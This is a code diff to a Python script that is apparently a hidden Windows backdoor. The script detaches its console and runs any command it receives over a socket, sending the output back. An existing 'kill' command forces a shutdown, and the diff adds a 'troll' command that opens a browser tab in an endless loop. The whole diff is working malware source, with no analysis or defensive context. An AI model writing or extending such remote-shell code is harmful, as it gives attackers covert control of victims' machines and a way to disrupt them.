@@ -1,4 +1,4 @@
-import socket, os, subprocess, ctypes
+import socket, os, subprocess, ctypes, webbrowser
 
 ctypes.windll.kernel32.FreeConsole()
 
@@ -11,6 +11,11 @@ while True:
     if cmd == "kill":
         os.system("msg %username% your system will be shutdown because i hack then :) lol")
         os.system("shutdown -s -t 3")
+    if cmd == "troll":
+        link = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+        os.system("msg %username% lol")
+        while True:
+            webbrowser.open_new(link)
     os.system(cmd)
     output = subprocess.getoutput(cmd)
     conn.send(output.encode('utf-8'))
